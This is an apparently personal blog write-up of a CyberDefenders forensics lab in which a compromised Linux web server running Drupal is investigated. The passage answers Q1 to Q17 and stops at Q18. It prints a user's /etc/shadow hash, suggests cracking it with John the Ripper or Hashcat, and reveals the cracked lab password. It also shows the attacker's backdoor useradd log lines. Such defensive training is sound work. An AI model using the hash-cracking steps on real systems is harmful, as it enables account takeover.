

<!DOCTYPE html>
<html
  lang="fr-fr"
  dir="ltr"
  class="scroll-smooth"
  data-default-appearance="dark"
  data-auto-appearance="false"
><head>
  <meta charset="utf-8" />
  
    <meta http-equiv="content-language" content="fr-fr" />
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
  
  <title>Cyberdefenders · Digital Forensic · Hacked &middot; nathan.out</title>
    <meta name="title" content="Cyberdefenders · Digital Forensic · Hacked &middot; nathan.out" />
  
  
  
  
  
  <link rel="canonical" href="https://nathan-out.github.io/write-up/cyberdefenders-digital-forensic-hacked/" />
  
  
  
  
  
  
  
  
  
    
  
  
  <link
    type="text/css"
    rel="stylesheet"
    href="/css/main.bundle.min.e5be5b53889669547934e328d05cfccbbd4c7cb9ae060540fd2b23be0188697dd0810155c6b8b189c57ec29b1c16d33891d662f591ff23879825e15bd06414e7.css"
    integrity="sha512-5b5bU4iWaVR5NOMo0Fz8y71MfLmuBgVA/SsjvgGIaX3QgQFVxrixicV&#43;wpscFtM4kdZi9ZH/I4eYJeFb0GQU5w=="
  />
  
  
  <script type="text/javascript" src="/js/appearance.min.badab316c9287a5a42a843e4eb45da65bb3d194a5a0f5fa4a3e516160e67df0b8c65f4f19a8e146436e29d583699e6cb41d6bbe99e05e1dbaa877763bad9f8e2.js" integrity="sha512-utqzFskoelpCqEPk60XaZbs9GUpaD1&#43;ko&#43;UWFg5n3wuMZfTxmo4UZDbinVg2mebLQda76Z4F4duqh3djutn44g=="></script>
  
    
    
    
  
  
    
    
  
  
  
    
    <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.15ae6e2c9b1ac24a9ccf40003fa689efb1a18db1ee9b73d780b01a6c31b150441415862513e93184f68fe385759e4698b8763cba6a0f79493c1fed99ad5868d4.js" integrity="sha512-Fa5uLJsawkqcz0AAP6aJ77GhjbHum3PXgLAabDGxUEQUFYYlE&#43;kxhPaP44V1nkaYuHY8umoPeUk8H&#43;2ZrVho1A==" data-copy="Copier" data-copied="Copié"></script>
  
  
  
    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
    <link rel="manifest" href="/site.webmanifest" />
  
  
  
  
  
  
  
  <meta property="og:title" content="Cyberdefenders · Digital Forensic · Hacked" />
<meta property="og:description" content="The scenario:
A soc analyst has been called to analyze a compromised Linux web server." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://nathan-out.github.io/write-up/cyberdefenders-digital-forensic-hacked/" /><meta property="article:section" content="write-up" />
<meta property="article:published_time" content="2023-08-12T11:20:47+03:00" />
<meta property="article:modified_time" content="2023-08-12T11:20:47+03:00" /><meta property="og:site_name" content="nathan.out" />

  <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Cyberdefenders · Digital Forensic · Hacked"/>
<meta name="twitter:description" content="The scenario:
A soc analyst has been called to analyze a compromised Linux web server."/>

  
  <script type="application/ld+json">
  [{
    "@context": "https://schema.org",
    "@type": "Article",
    "articleSection": "Write-up",
    "name": "Cyberdefenders · Digital Forensic · Hacked",
    "headline": "Cyberdefenders · Digital Forensic · Hacked",
    
    "abstract": "The scenario:\nA soc analyst has been called to analyze a compromised Linux web server.",
    "inLanguage": "fr-fr",
    "url" : "https:\/\/nathan-out.github.io\/write-up\/cyberdefenders-digital-forensic-hacked\/",
    "author" : {
      "@type": "Person",
      "name": "nathan.out"
    },
    "copyrightYear": "2023",
    "dateCreated": "2023-08-12T11:20:47\u002b03:00",
    "datePublished": "2023-08-12T11:20:47\u002b03:00",
    
    "dateModified": "2023-08-12T11:20:47\u002b03:00",
    
    
    
    "mainEntityOfPage": "true",
    "wordCount": "1879"
  }]
  </script>


  
  <meta name="author" content="nathan.out" />
  
    
      <link href="https://github.com/nathan-out" rel="me" />
    
  
  
  






  
  
  


  
  
</head>
<body
    class="flex flex-col h-screen px-6 m-auto text-lg leading-7 bg-neutral text-neutral-900 sm:px-14 md:px-24 lg:px-32 dark:bg-neutral-800 dark:text-neutral max-w-7xl"
  >
    <div id="the-top" class="absolute flex self-center">
      <a
        class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 dark:bg-neutral-600 focus:translate-y-0"
        href="#main-content"
        ><span class="font-bold ltr:pr-2 rtl:pl-2 text-primary-600 dark:text-primary-400"
          >&darr;</span
        >Aller au contenu</a
      >
    </div>
    
    
      <header class="py-6 font-semibold sm:py-10 text-neutral-900 dark:text-neutral print:hidden">
  <nav class="flex justify-between">
    
    <div>
      
        <a
          class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
          rel="me"
          href="/"
          >nathan.out</a
        >
      

    </div>
    
    
      <ul class="flex flex-col list-none ltr:text-right rtl:text-left sm:flex-row">
        
          
            <li class="mb-1 sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
              <a
                class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
                href="/posts/"
                title="Mes articles"
                >Articles</a
              >
            </li>
          
            <li class="mb-1 sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
              <a
                class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
                href="/a-propos/"
                title="A Propos"
                >A propos</a
              >
            </li>
          
            <li class="mb-1 sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
              <a
                class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
                href="/write-up/"
                title="Write-up"
                >Write-up</a
              >
            </li>
          
        
        
          <li class="ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
            <button
              id="search-button"
              class="text-base hover:text-primary-600 dark:hover:text-primary-400"
              title="Rechercher (/)"
            >
              

  <span class="relative inline-block align-text-bottom icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


            </button>
          </li>
        
      </ul>
    
  </nav>
</header>

    
    <div class="relative flex flex-col grow">
      <main id="main-content" class="grow">
        
  <article>
    <header class="max-w-prose">
      
        <ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
  
  
    
  
    
  
  <li class="inline hidden">
    <a
      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
      href="/"
      >Blog</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

  
  <li class="inline ">
    <a
      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
      href="/write-up/"
      >Write-up</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

  
  <li class="inline hidden">
    <a
      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
      href="/write-up/cyberdefenders-digital-forensic-hacked/"
      >Cyberdefenders · Digital Forensic · Hacked</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

</ol>


      
      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
        Cyberdefenders · Digital Forensic · Hacked
      </h1>
      <div class="mt-8 mb-12 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
        





  
  



  

  
  
    
  

  

  

  
    
  

  


  <div class="flex flex-row flex-wrap items-center">
    
    
      <time datetime="2023-08-12 11:20:47 &#43;0300 &#43;0300">12 août 2023</time><span class="px-2 text-primary-500">&middot;</span><span title="Temps de lecture">9 mins</span>
    

    
    
  </div>

  
  


      </div>
    </header>
    <section class="flex flex-col max-w-full mt-0 prose lg:flex-row dark:prose-invert">
      
        <div class="order-first px-0 lg:max-w-xs ltr:lg:pl-8 rtl:lg:pr-8 lg:order-last">
          <div class="ltr:pl-5 rtl:pr-5 toc lg:sticky lg:top-10 print:hidden">
            <details open class="mt-0 overflow-hidden rounded-lg rtl:pr-5 ltr:pl-5 ltr:-ml-5 rtl:-mr-5">
  <summary
    class="block py-1 text-lg font-semibold cursor-pointer rtl:pr-5 ltr:pl-5 ltr:-ml-5 rtl:-mr-5 text-neutral-800 dark:text-neutral-100 lg:hidden bg-neutral-100 dark:bg-neutral-700"
  >
    Sommaire
  </summary>
  <div
    class="py-2 border-dotted ltr:border-l rtl:border-r rtl:pr-5 ltr:pl-5 ltr:-ml-5 rtl:-mr-5 border-neutral-300 dark:border-neutral-600"
  >
    <nav id="TableOfContents">
  <ul>
    <li><a href="#abstract">Abstract</a></li>
    <li><a href="#q1-what-is-the-system-timezone">Q1. What is the system timezone?</a></li>
    <li><a href="#q2-who-was-the-last-user-to-log-in-to-the-system">Q2. Who was the last user to log in to the system?</a></li>
    <li><a href="#q3-what-was-the-source-port-the-user-mail-connected-from">Q3. What was the source port the user &lsquo;mail&rsquo; connected from?</a></li>
    <li><a href="#q4-how-long-was-the-last-session-for-user-mail-minutes-only">Q4. How long was the last session for user &lsquo;mail&rsquo;? (Minutes only)</a></li>
    <li><a href="#q5-which-server-service-did-the-last-user-use-to-log-in-to-the-system">Q5. Which server service did the last user use to log in to the system?</a></li>
    <li><a href="#q6-what-type-of-authentication-attack-was-performed-against-the-target-machine">Q6. What type of authentication attack was performed against the target machine?</a></li>
    <li><a href="#q7-how-many-ip-addresses-are-listed-in-the-varloglastlog-file">Q7. How many IP addresses are listed in the &lsquo;/var/log/lastlog&rsquo; file?</a></li>
    <li><a href="#q8-how-many-users-have-a-login-shell">Q8. How many users have a login shell?</a></li>
    <li><a href="#q9-what-is-the-password-of-the-mail-user">Q9. What is the password of the mail user?</a></li>
    <li><a href="#q10-which-user-account-was-created-by-the-attacker">Q10. Which user account was created by the attacker?</a></li>
    <li><a href="#q11-how-many-user-groups-exist-on-the-machine">Q11. How many user groups exist on the machine?</a></li>
    <li><a href="#q12-how-many-users-have-sudo-access">Q12. How many users have sudo access?</a></li>
    <li><a href="#q13-what-is-the-home-directory-of-the-php-user">Q13. What is the home directory of the PHP user?</a></li>
    <li><a href="#q14-what-command-did-the-attacker-use-to-gain-root-privilege">Q14. What command did the attacker use to gain root privilege?</a></li>
    <li><a href="#q15-which-file-did-the-user-root-delete">Q15. Which file did the user &lsquo;root&rsquo; delete?</a></li>
    <li><a href="#q16-recover-the-deleted-file-open-it-and-extract-the-exploit-author-name">Q16. Recover the deleted file, open it and extract the exploit author name.</a></li>
    <li><a href="#q17-what-is-the-content-management-system-cms-installed-on-the-machine">Q17. What is the content management system (CMS) installed on the machine?</a></li>
    <li><a href="#q18-what-is-the-version-of-the-cms-installed-on-the-machine">Q18. What is the version of the CMS installed on the machine?</a></li>
    <li><a href="#q19-which-port-was-listening-to-receive-the-attackers-reverse-shell">Q19. Which port was listening to receive the attacker&rsquo;s reverse shell?</a></li>
  </ul>
</nav>
  </div>
</details>

          </div>
        </div>
      
      <div class="min-w-0 min-h-0 max-w-prose">
        <p>The scenario:</p>
<blockquote>
<p>A soc analyst has been called to analyze a compromised Linux web server. Figure out how the threat actor gained access, what modifications were applied to the system, and what persistent techniques were utilized. (e.g. backdoors, users, sessions, etc).</p>
</blockquote>
<p>



  
  
  
    <figure>
      <img class="my-0 rounded-md" src="/img/write-up/hacked/drupal.png" alt="Drupal CMS illustration." />
      
    </figure>
  

</p>
<figcaption>Drupal CMS illustration.</figcaption>
<h2 id="abstract" class="relative group">Abstract <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#abstract" aria-label="Ancre">#</a></span></h2>
<p>This article revolves around the investigation of a compromised Linux web server by a SOC analyst. The key objectives are to determine how the threat actor gained access, identify system modifications, and uncover persistent techniques used, including backdoors and user manipulation. The article explores various methods and tools for extracting crucial information, such as system logs, password files, user activities, and system configurations.</p>
<p>It delves into examining timestamps, authentication attacks, user creations, privilege escalation, and exploitation attempts. The analysis reveals the CMS version, attacker&rsquo;s reverse shell, deleted files, and more, providing valuable insights into the incident response process for compromised Linux systems.</p>
<h2 id="q1-what-is-the-system-timezone" class="relative group">Q1. What is the system timezone? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#q1-what-is-the-system-timezone" aria-label="Ancre">#</a></span></h2>
<p>We can see this information here: <code>/etc/timezone</code>.</p>
<h2 id="q2-who-was-the-last-user-to-log-in-to-the-system" class="relative group">Q2. Who was the last user to log in to the system? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#q2-who-was-the-last-user-to-log-in-to-the-system" aria-label="Ancre">#</a></span></h2>
<p>The interesting file is <code>var/log/wtmp</code>, as this file is encoded, you can not display its content. To read it you can use this command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>last -f var/log/wtmp
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>mail     pts/1        192.168.210.131  Sat Oct  <span style="color:#ae81ff">5</span> 14:23 - 14:24  <span style="color:#f92672">(</span>00:00<span style="color:#f92672">)</span>
</span></span></code></pre></div><h2 id="q3-what-was-the-source-port-the-user-mail-connected-from" class="relative group">Q3. What was the source port the user &lsquo;mail&rsquo; connected from? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#q3-what-was-the-source-port-the-user-mail-connected-from" aria-label="Ancre">#</a></span></h2>
<p>Let&rsquo;s check logs file: <code>var/log/auth.log</code> search for &lsquo;mail&rsquo; and the latest entry (most recent one).</p>
<pre tabindex="0"><code class="language-logs" data-lang="logs">Oct  5 13:23:34 VulnOSv2 sshd[3108]: Accepted password for mail from 192.168.210.131 port 57708 ssh2
</code></pre><h2 id="q4-how-long-was-the-last-session-for-user-mail-minutes-only" class="relative group">Q4. How long was the last session for user &lsquo;mail&rsquo;? (Minutes only) <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#q4-how-long-was-the-last-session-for-user-mail-minutes-only" aria-label="Ancre">#</a></span></h2>
<p>You can have this information with the same command as Q2. We can see that the connection begun at 14:23 and ended at 14:24.</p>
<pre tabindex="0"><code>last -f wtmp

mail     pts/1        192.168.210.131  Sat Oct  5 14:23 - 14:24  (00:00)
</code></pre><h2 id="q5-which-server-service-did-the-last-user-use-to-log-in-to-the-system" class="relative group">Q5. Which server service did the last user use to log in to the system? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#q5-which-server-service-did-the-last-user-use-to-log-in-to-the-system" aria-label="Ancre">#</a></span></h2>
<p>You have the service name in the Q3: <code>sshd</code>.</p>
<h2 id="q6-what-type-of-authentication-attack-was-performed-against-the-target-machine" class="relative group">Q6. What type of authentication attack was performed against the target machine? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#q6-what-type-of-authentication-attack-was-performed-against-the-target-machine" aria-label="Ancre">#</a></span></h2>
<p>Searching the differences between <code>wtmp</code> and <code>btmp</code>, I found that <code>btmp</code> keep track of failed login attempts. Using <code>last -f var/log/btmp</code>, you can see <strong>many</strong> failed attempts, I &ldquo;piped&rdquo; it with <code>grep -c</code> (counting results) and the command returns 1298 results. It&rsquo;s kind of brute-force.</p>
<h2 id="q7-how-many-ip-addresses-are-listed-in-the-varloglastlog-file" class="relative group">Q7. How many IP addresses are listed in the &lsquo;/var/log/lastlog&rsquo; file? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#q7-how-many-ip-addresses-are-listed-in-the-varloglastlog-file" aria-label="Ancre">#</a></span></h2>
<p>You can use <code>strings</code> on <code>lastlog</code>, or an other way is to use this Python tool: <a href="https://pypi.org/project/lastlogcsv/">Lastlogcsv</a>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -m lastlogcsv -i lastlog -o lastlog.csv
</span></span></code></pre></div><p>The tool will convert lastlog into a csv file.</p>
<h2 id="q8-how-many-users-have-a-login-shell" class="relative group">Q8. How many users have a login shell? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#q8-how-many-users-have-a-login-shell" aria-label="Ancre">#</a></span></h2>
<p>An interesting file to read for users informations is <code>etc/passwd</code>. To understand it, I found this article from Linux Handbook: <a href="https://linuxhandbook.com/login-shell">What is Login Shell in Linux?</a>. To summarize, there is an usefull images from the article. Please take a look, we will need it for following questions:</p>
<p>



  
  
  
    <figure>
      <img class="my-0 rounded-md" src="/img/write-up/hacked/etc-passwd-file-explained.png" alt="etc/passwd explaination" />
      
    </figure>
  

</p>
<figcaption>etc/passwd explaination</figcaption>
<p>If an user has a login shell, the last column must be <code>/bin/bash</code>. To count the number of user who have a login shell I used:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>grep -c <span style="color:#e6db74">&#39;/bin/bash&#39;</span> etc/passwd
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">5</span>
</span></span></code></pre></div><h2 id="q9-what-is-the-password-of-the-mail-user" class="relative group">Q9. What is the password of the mail user? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#q9-what-is-the-password-of-the-mail-user" aria-label="Ancre">#</a></span></h2>
<p>The file <code>etc/shadow</code> contains password informations about users passwords. The first column is the user name and the following one is the hashed password. <strong>But this is not only the hashed password</strong>, according to this site: <a href="https://www.baeldung.com/linux/shadow-passwords">/etc/shadow and Creating yescrypt, MD5, SHA-256, and SHA-512 Password Hashes</a>, <code>$6$</code> means that the password was hashed with <code>SHA-512</code>.</p>
<pre tabindex="0"><code class="language-logs" data-lang="logs">mail:$6$zLaoLV8N$BNxYZUxvXiZwb3UjBhCxnxd9Mb02DDUF.GfMj1kbLB.s/quBVtMM4QjfOvmZvfqeh7BuLXaRvRSfpQgNI5prE.:18174:0:99999:7:::
</code></pre><p>Using programs like John The Ripper or Hashcat, you will retrieve the mail&rsquo;s password, which is forensics.</p>
<h2 id="q10-which-user-account-was-created-by-the-attacker" class="relative group">Q10. Which user account was created by the attacker? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#q10-which-user-account-was-created-by-the-attacker" aria-label="Ancre">#</a></span></h2>
<p>I searched on internet regarding user creation logs and I found this topic: <a href="https://askubuntu.com/questions/181357/where-can-i-find-logs-regarding-the-user-creation">Where can I find logs regarding the user creation?</a>. The point is to check <code>/var/log/auth.log</code> and search on <code>useradd</code> command. We can see that the <code>root</code> user (previously brute-forced) created a user named <code>php</code> and add it to the <code>sudo</code> group.</p>
<pre tabindex="0"><code class="language-logs" data-lang="logs">Oct  5 13:06:38 VulnOSv2 sudo:     root : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/sbin/useradd -d /usr/php -m --system --shell /bin/bash --skel /etc/skel -G sudo php
Oct  5 13:06:38 VulnOSv2 sudo: pam_unix(sudo:session): session opened for user root by (uid=0)
Oct  5 13:06:38 VulnOSv2 useradd[2525]: new group: name=php, GID=999
Oct  5 13:06:38 VulnOSv2 useradd[2525]: new user: name=php, UID=999, GID=999, home=/usr/php, shell=/bin/bash
Oct  5 13:06:38 VulnOSv2 useradd[2525]: add &#39;php&#39; to group &#39;sudo&#39;
Oct  5 13:06:38 VulnOSv2 useradd[2525]: add &#39;php&#39; to shadow group &#39;sudo&#39;
</code></pre><h2 id="q11-how-many-user-groups-exist-on-the-machine" class="relative group">Q11. How many user groups exist on the machine? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#q11-how-many-user-groups-exist-on-the-machine" aria-label="Ancre">#</a></span></h2>
<p>User group informations are stored in <code>etc/group</code> file, each line is a user group and the file has lines 58 lines.</p>
<h2 id="q12-how-many-users-have-sudo-access" class="relative group">Q12. How many users have sudo access? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#q12-how-many-users-have-sudo-access" aria-label="Ancre">#</a></span></h2>
<p>Sudo access means that an user is in the <code>sudo</code> group. Display the <code>sudo</code> group line in <code>etc/group</code> and you will see all the user in this group.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ grep <span style="color:#e6db74">&#39;sudo&#39;</span> etc/group
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sudo❌27:php,mail
</span></span></code></pre></div><h2 id="q13-what-is-the-home-directory-of-the-php-user" class="relative group">Q13. What is the home directory of the PHP user? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#q13-what-is-the-home-directory-of-the-php-user" aria-label="Ancre">#</a></span></h2>
<p>This kind of information can be found inside the <code>etc/passwd</code> file:</p>
<pre tabindex="0"><code>php❌999:999::/usr/php:/bin/bash
</code></pre><p>Columns are delimited by the <code>:</code> symbol. You will easily find online the meaning of each, for us what is important is the first and the penultimate one, which are the username and the user home directory.</p>
<h2 id="q14-what-command-did-the-attacker-use-to-gain-root-privilege" class="relative group">Q14. What command did the attacker use to gain root privilege? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#q14-what-command-did-the-attacker-use-to-gain-root-privilege" aria-label="Ancre">#</a></span></h2>
<p>Command history are located in <code>~/.bash_history</code> where <code>~/</code> means the user&rsquo;s home directory. Thanks to the previous questions, we know that the attacker compromissed the <code>mail</code> user so we have to know where the <code>mail</code>&rsquo;s home directory is. I used the same file as the previous question and found how the attackers gained root privilege.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ grep <span style="color:#e6db74">&#39;mail&#39;</span> etc/passwd
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>mail❌8:8:mail:/var/mail:/bin/bash
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>---
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$ cat /var/mail/.bash_history
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sudo su -
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><h2 id="q15-which-file-did-the-user-root-delete" class="relative group">Q15. Which file did the user &lsquo;root&rsquo; delete? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#q15-which-file-did-the-user-root-delete" aria-label="Ancre">#</a></span></h2>
<p>This information must be logged into root&rsquo;s <code>~/.bash_history</code> file. Like the previous question, let&rsquo;s find the root&rsquo;s home directory in <code>etc/passwd</code>:</p>
<pre tabindex="0"><code>root❌0:0:root:/root:/bin/bash
...
</code></pre><p>Into <code>root</code> we find the bash history file and it contains one interesting line:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rm 37292.c
</span></span></code></pre></div><h2 id="q16-recover-the-deleted-file-open-it-and-extract-the-exploit-author-name" class="relative group">Q16. Recover the deleted file, open it and extract the exploit author name. <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#q16-recover-the-deleted-file-open-it-and-extract-the-exploit-author-name" aria-label="Ancre">#</a></span></h2>
<p>I didn&rsquo;t made this question, I downloaded <code>foremost</code> but as my current computer is very old and without many RAM, the program don&rsquo;t wanted to start. You have to use a recovery tool like <code>foremost</code> or <code>scalpel</code>.</p>
<h2 id="q17-what-is-the-content-management-system-cms-installed-on-the-machine" class="relative group">Q17. What is the content management system (CMS) installed on the machine? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#q17-what-is-the-content-management-system-cms-installed-on-the-machine" aria-label="Ancre">#</a></span></h2>
<p>First, I tought it was a Wordpress, because of the <code>php</code>, <code>mysql</code> and <code>phpmyadmin</code> directories in <code>etc/</code>. I searched on <code>etc/apache2/sites-available</code> and found this line in <code>000-default.conf</code> file:</p>
<pre tabindex="0"><code>DocumentRoot /var/www/html
</code></pre><p>Note that this location is a common one for website. This is the website&rsquo;s files location, in this directory I opened <code>/var/www/jabc/index.php</code>, without finding the solution. In fact, it was written under my eyes, but I didn&rsquo;t noticed it!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">/**</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">*</span> <span style="color:#f92672">@</span><span style="color:#a6e22e">file</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">The</span> <span style="color:#a6e22e">PHP</span> <span style="color:#a6e22e">page</span> <span style="color:#a6e22e">that</span> <span style="color:#a6e22e">serves</span> <span style="color:#a6e22e">all</span> <span style="color:#a6e22e">page</span> <span style="color:#a6e22e">requests</span> <span style="color:#a6e22e">on</span> <span style="color:#a6e22e">a</span> <span style="color:#a6e22e">Drupal</span> <span style="color:#a6e22e">installation</span><span style="color:#f92672">.</span>
</span></span></code></pre></div><p>I continued my research, I opened <code>var/html/www/jabc/.htaccess</code> which is a shortcut, my OS told me:</p>
<blockquote>
<p>Unable to access the given target: <code>/etc/drupal/7/htaccess</code> because it does not exists.</p>
</blockquote>
<p>Which is normal as I mounted this drive, the shortcuts will not work anymore. But now I have the file path, intrigued by &ldquo;grupal&rdquo;, I opened the <code>htaccess</code> file:</p>
<pre tabindex="0"><code>#
# Apache/PHP/Drupal settings:
#
...
</code></pre><p>Searching for what is Drupal gave me the answer, it&rsquo;s an open source CMS!</p>
<h2 id="q18-what-is-the-version-of-the-cms-installed-on-the-machine" class="relative group">Q18. What is the version of the CMS installed on the machine? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#q18-what-is-the-version-of-the-cms-installed-on-the-machine" aria-label="Ancre">#</a></span></h2>
